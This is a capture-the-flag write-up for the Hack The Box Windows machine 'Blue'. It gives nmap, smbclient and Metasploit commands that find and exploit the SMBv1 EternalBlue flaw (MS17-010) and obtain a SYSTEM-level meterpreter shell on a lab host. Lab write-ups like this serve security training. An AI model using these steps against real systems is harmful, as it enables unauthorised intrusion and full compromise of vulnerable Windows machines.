# Box: Blue
# Level: Easy
# OS: Windows
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A 10.129.110.225 -T4  -v -p-```

Well from the scan we hav3 3 main ports opened. Our enumeration today will be focused on the port runnint the netbios service.



# Enumeration

Lets start by checking the number of shares available on the smb server

command:```smbclient -L 10.129.110.225```

This is going to prompt you for a password, just hit the ```Enter key``` since we don't have any password

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Blue]
└─$ smbclient -L 10.129.110.225
Password for [WORKGROUP\bl4ck4non]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.110.225 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
We have 5 smb shares available on the server

I couldn't find anything after connecting to the shares🥲.

We can check out nmap scripting engine to scan the smb port for potential vulnerabilities

command:```nmap -p 445 --script smb-vuln*.nse 10.129.110.225```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bad2e7ad-4287-4517-a8ce-7adcfcd7c9d5)

Checking out the CVE we find this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6923c708-17bc-472f-8a64-50392c648e03)

So it is a vulnerability that exists in ```SMBv1```. The vulnerability is  also known as ```EternalBlue```. Well, lets exploit😎




# Exploitation

We can use the metasploit module for this

command:```msfconsole```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/04cc7b9c-0896-4f6c-a88e-6bcfff2f73bf)

Good

command:```search eternalblue```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4411b9d9-3489-466d-bbec-83b29150ce14)

Next,

command:```use exploit/windows/smb/ms17_010_eternalblue```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0aa62370-9387-4a0c-a5fe-5a7aa7cff8a6)

We'll set the RHOSTS and LHOST. RHSOT is the target's IP, while LHOST is our tun0 IP

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/79ef8f25-2b66-4677-a5b3-77cf238d55ac)

Now we can use the ```exploit``` command to exploit

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ff992a9b-e7f7-45dc-abad-36a2fd9577cc)

We got a meterpreter session hehehe

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb99258e-33d4-449c-b637-585c72f91b16)

We won't need to escalate privileges because we spawned a shell as the highest privileged user which is ```NT Authority\System```

Lets locate the flag

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/80dabba0-f61c-4d55-85b5-747e07af86cf)

Well that's all
















